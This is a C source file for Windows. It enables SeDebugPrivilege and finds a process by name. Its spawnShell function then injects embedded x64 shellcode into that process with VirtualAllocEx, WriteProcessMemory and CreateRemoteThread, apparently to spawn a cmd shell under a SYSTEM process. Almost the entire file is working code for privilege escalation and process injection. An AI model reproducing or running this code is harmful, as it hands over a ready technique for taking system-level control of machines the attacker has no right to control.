#include <stdio.h>
#include <windows.h>
#include <stdint.h>
#include <tlhelp32.h>


#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif
 



static void getByteString(UINT32 startaddr, UINT8* bytesbuf, size_t bytesread)
{
	wchar_t debugStr[FILENAME_MAX];
	char bytestr[65];
	char charstr[20];

	if (bytesread < 1) {
		return;
	}

	if (bytesread > 16) {
		return;
	}
	unsigned int i;

	char* bytestr_tmp = bytestr;
	unsigned char c;
	for (i = 0; i < bytesread; i++) {
		c = *(bytesbuf + i);
		_snprintf(bytestr_tmp, 4, "%02x ", c);
		bytestr_tmp += 3;
	}
	if (bytesread < 16)
	{
		for (int i = bytesread; i < 16; i++) {
			*bytestr_tmp = 0x20;
			bytestr_tmp += 1;
			*bytestr_tmp = 0x20;
			bytestr_tmp += 1;
			*bytestr_tmp = 0x20;
			bytestr_tmp += 1;
		}
		*bytestr_tmp = '\0';
	}
	char* charstr_tmp = charstr;
	for (i = 0; i < bytesread; i++) {
		c = *(bytesbuf + i);
		if ((c < 127) && (c > 31) && (c != 92) &&
			(c != 34)) // exclude '\'=92 and "=34 for JSON comp.
		{
			_snprintf(charstr_tmp++, 2, "%c", c);
		}

		else {
			_snprintf(charstr_tmp++, 2, ".");
		}
	}

	wsprintf(debugStr, L"%08x %S   %S\n", startaddr, bytestr, charstr);
	OutputDebugString(debugStr);
	return;
}



static void hexdump(UINT8* bytesbufRef, size_t size_len)
{

	for (int i = 0; i <= size_len / 16; i++) {


		getByteString((i * 16),
			bytesbufRef + (i * 16),
			(i * 16) + 16 > size_len ? size_len % 16
			: 16);

	}
}
/*
void hexdump(void *mem, unsigned int len)
{
        unsigned int i, j;
        
        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
        {
                /* print offset #1#
                if(i % HEXDUMP_COLS == 0)
                {
                        printf("0x%06x: ", i);
                }
 
                /* print hex data #1#
                if(i < len)
                {
                        printf("%02x ", 0xFF & ((char*)mem)[i]);
                }
                else /* end of block, just aligning for ASCII dump #1#
                {
                        printf("   ");
                }
                
                /* print ASCII dump #1#
                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
                {
                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
                        {
                                if(j >= len) /* end of block, not really printing #1#
                                {
                                        putchar(' ');
                                }
                                else if(isprint(((char*)mem)[j])) /* printable char #1#
                                {
                                        putchar(0xFF & ((char*)mem)[j]);        
                                }
                                else /* other char #1#
                                {
                                        putchar('.');
                                }
                        }
                        putchar('\n');
                }
        }
}
*/



DWORD GetPrivilege ( void ) {
    DWORD dwLen;
    BOOL bRes;
    HANDLE hToken;
 
    if  ( ! OpenProcessToken (
        GetCurrentProcess (),
        TOKEN_QUERY,
        & hToken))
    {
        fprintf (stderr,  "[-] OpenProcessToken error:% u \n" , GetLastError ());
        return  FALSE;
    }
 
    bRes  =  GetTokenInformation (
        hToken,
        TokenPrivileges,
        NULL ,
        0 ,
        & dwLen
    );
 
    char*  pBuffer=(char*)malloc(dwLen);
 
    bRes  =  GetTokenInformation (
        hToken,
        TokenPrivileges,
        pBuffer,
        dwLen,
        & dwLen
    );
 
    if  ( ! bRes)
    {
        CloseHandle (hToken);
        return  FALSE;
    }
 
    TOKEN_PRIVILEGES *  pPrivs  =  (TOKEN_PRIVILEGES * ) pBuffer;
    for  (DWORD i  =  0 ; i  <  pPrivs->PrivilegeCount; i++)
    {
        printf ( "LUID:% u% u, Attributes:% u \n" , 
            pPrivs->Privileges[i].Luid.HighPart, 
            pPrivs->Privileges[i].Luid.LowPart,
            pPrivs->Privileges[i].Attributes);
    }
 
    CloseHandle (hToken);
 
    if  ( ! bRes)  return  FALSE;
    
    return  TRUE;
}


BOOL checkPrivilege()
{
	PRIVILEGE_SET		privSet;
	LUID_AND_ATTRIBUTES Privileges[1];
	BOOL				isPrivilegeSet = FALSE;
    HANDLE currentProcessHandle;
    HANDLE hTokenHandle;

	currentProcessHandle = GetCurrentProcess();
	
	OpenProcessToken(currentProcessHandle, TOKEN_ALL_ACCESS, &hTokenHandle);

	if (hTokenHandle == INVALID_HANDLE_VALUE)
	{
		printf("Failed to retrieve process token handle \n");
		return -1;
	}

	LookupPrivilegeValue(NULL, (const char *)"SeDebugPrivilege", &(Privileges[0].Luid));
	Privileges[0].Attributes = 0;

	privSet.PrivilegeCount = 1;
	privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
	memcpy(privSet.Privilege, Privileges, sizeof(Privileges));

	PrivilegeCheck(hTokenHandle, &privSet, &isPrivilegeSet);

     while (!isPrivilegeSet)
     {
         TOKEN_PRIVILEGES tp;
         tp.PrivilegeCount = 1;
         printf("Trying to set LUID %d\n", Privileges[0].Luid);
         tp.Privileges[0].Luid = Privileges[0].Luid;
         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
         if ( !AdjustTokenPrivileges(
             hTokenHandle, 
             FALSE, 
             &tp, 
             sizeof(TOKEN_PRIVILEGES), 
             (PTOKEN_PRIVILEGES) NULL, 
             (PDWORD) NULL) )
         { 
             printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
             isPrivilegeSet = FALSE;
             GetPrivilege();
             return FALSE;
         }
         else
         {
             if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
             {
                 printf("The token does not have the specified privilege. \n");
             } 
             privSet.PrivilegeCount = 1;
             privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
             memcpy(privSet.Privilege, Privileges, sizeof(Privileges));
             PrivilegeCheck(hTokenHandle, &privSet, &isPrivilegeSet);
             GetPrivilege();
             if (isPrivilegeSet)
                 return TRUE;
             puts("Failed to get SeDebugPrivilege ! retrying...");
             getchar();
         }
     }

	return (isPrivilegeSet);
}


DWORD getProcessId(const char *processname)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD result = 0;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnap) return(FALSE);

    pe32.dwSize = sizeof(PROCESSENTRY32); // <----- IMPORTANT

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);          // clean the snapshot object
        printf("!!! Failed to gather information on system processes! \n");
        return 0;
    }

    do
    {
        printf("Checking process %s that have PID %d!\n", pe32.szExeFile, pe32.th32ProcessID);
        if (0 == strcmp(processname, pe32.szExeFile))
        {
            result = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return result;
}


void spawnShell(size_t processID)
{
	HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
	PVOID  pLibRemote;
	// DWORD processID;
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x00";



	hSystemProcess = OpenProcess(GENERIC_ALL, 0, processID);

	if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
	{
		printf("[-] Couldn't open system process...\n");
		exit(1);
	}
	printf("[+]Got a handle on a system Process: %08p\n", hSystemProcess);


	pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!pLibRemote)
	{
		printf("[-]Virtual alloc failed !\n");
		exit(0);
	}

	printf("[+]Allocation in system process succeded with address %08p\n", pLibRemote);

	if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
	{
		printf("[-]WriteProcessMemory failed !\n");
		exit(1);
	}

	HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);

	printf("[+]Writing in system process succeded\n");

	if (hThread == NULL) {
		printf("[-]CreateRemoteThread failed !\n");
		exit(1);
	}
	else
		printf("[+]Remote thread created !\n");
	CloseHandle(hSystemProcess);
}
